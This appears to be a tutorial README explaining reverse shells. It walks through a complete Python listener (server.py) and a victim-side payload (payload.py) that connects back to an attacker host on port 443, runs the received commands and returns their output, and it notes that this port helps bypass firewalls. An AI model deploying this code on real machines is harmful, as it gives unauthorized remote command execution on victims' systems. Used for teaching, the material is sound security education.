# Reverse-Shell
A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the attacker’s host. Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack. Reverse shells can also work across a NAT or firewall.
One of the most known frameworks that ethical hackers use in order to create and commnunicate with a reverse shell is MSFVenom and MSFconsole. 

How does it work?? 
To understand the mecanism i decided to write a simple reversehell in python in order to expalin the basics of the reverse shell theory.

# Requirements
To do so we need these common python libraries: 

### socket:
This module provides access to the BSD socket interface. It is available on all modern Unix systems, Windows, MacOS, and probably additional platforms.
The Python interface is a straightforward transliteration of the Unix system call and library interface for sockets to Python’s object-oriented style: the socket() function returns a socket object whose methods implement the various socket system calls. Parameter types are somewhat higher-level than in the C interface: as with read() and write() operations on Python files, buffer allocation on receive operations is automatic, and buffer length is implicit on send operations.

### OS
This module provides a portable way of using operating system dependent functionality. We are going to use this library in order to execute the commands sent by the attacker on the victim machine

### sys
Python sys module has several methods and variables that can alter various aspects of the Python runtime environment. It permits operating on the interpreter by giving access and information about the constants, variables, and functions that have a strong interaction with the interpreter.

### subprocess
The subprocess module allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.

# Code explication

## server.py
this is the script the hacker will be running on his machine/server this code is going to accpet and establish communication with the client side.

Coding the server side we only need the sockett libaray.

```
server_host= "0.0.0.0"
server_port= 443
data_size = 1024 * 128
SEPARATOR = "<sep>"
cyber = socket.socket()
```
As you can understanf from the variable names the server_host is the IP address of our server/attacker_machine we used the IP 0.0.0.0 in order to make the server reachable through all the IPv4 addresses of the server. For the server_port I used the port 443. We can use any port we want but the port 80 and 443 are widely used to bypass firewalls. data_size is the maximum ammoun of data that the client can send to the server and versversa.
SPERATOR is the seperation between the data sent or received.

then I created a socket and I called it cyber this is what we are going to use in the second part of our code.

Let's bind the socket that we created to out server IP and port that we initiated in the first two commands.
```
cyber.bind((server_host,server_port))
```
One of the most important part in creating such server is that it should have the ability to listen and accept incoming requests that why we need this two lines:
```
cyber.listen(10)
client_socket, client_ip = cyber.accept()
```
the listen function will allow us to listen to the incoming connections and the paramater 10 I used is the maximum length to which the queue of pending connections for sockfd may grow. That means if we receive 12 requests before we accept the connection then 2 of these requests will be droped.
The second line means that we accepted the connection from the client (our victim machine) and we stored the victim_socket and the victim_adress in two different variabales.
```
print(f"{client_ip[0]}:{client_ip[1]} Connected!")
```
This output will have the following format IP:PORT connected!
The first step we will do after having a connected client is to try and get the working directory on the victims devices this is why we will use the following code:
```
cmd = client_socket.recv(data_size).decode()
print("[+] Current working directory:", cmd)
```
A lot of people will be aseked why I used the decode function will because we need to encode the data in bytes to be sent theough the victim socket.
The main process of sending commands to the victims device will be in this part of the code:
```
while True:
    command = input(f"{cmd}~$ ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(data_size).decode()
    results,cmd = output.split(SEPARATOR)
    print(results)
```
basicly what we are doing is that we are verifying if the command which is the input of the hacker is not blank if it's the case then we will encode the command and send it to the victim. If hte command in lower case is exit then we will break out that means we will shutdown the server and then the communication with the client will die. If the process is executed correctly then we can receaive data from the victim and output. This is what the last 3 lines of code are doing on our server code.

## payload.py
The payload is the portion of the malware which performs malicious action. In our case the payload is the script that will be running on the victims device. 

let's start by importing the needed libraries and setting up the varaibles we will use in order to establish the communication with the attackers server.
```
server_host = #server_IP
server_port = 443
data_size = 1024 * 128
SEPARATOR = "<sep>"
victim = socket.socket()
victim.connect((server_host,server_port))
```
This is made for educational purposes and the main goal is to explain the theory behind revere shells this is why we cab see that the hacker's IP will be in plain text. In real life senarios the payload is obfuscated so it will be so hard to identify the hackers IP.
For this part the only difference we got from the server code is in the last line victim.connect and not bind because the victim will try to connect on the server we already created.
Well the server is waiting fot our working directory this is why we should send it first to do that we will use the OS library to run a local command wich is cwd the current working directory and we will send it through the socket this is done by the following code:

```
cmd = os.getcwd()
victim.send(cmd.encode())
```

the main job of the payload is that it will execute the commands sent by the attacker to do so we need to accept the received data using this line of code:
```
    command = victim.recv(data_size).decode()
    splited_command= command.split()
```
all what we have to do is to verify that the command is not blank, if it's an exit then we will shutdown the communication then we will store the output of the executed commands and send it back to the server. All of this is made possible by this code:
```
while True:
    command = victim.recv(data_size).decode()
    splited_command= command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(''.join(splited_command[1:]))
        except FileNotFounfError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cmd = os.getcwd()
    message = f"{output}{SEPARATOR}{cmd}"
    victim.send(message.encode())
victim.close()
```

author: cybereagle2001

used refrences : pythoncode - acunetix - docs.python - stackoverflow -wikipedia 
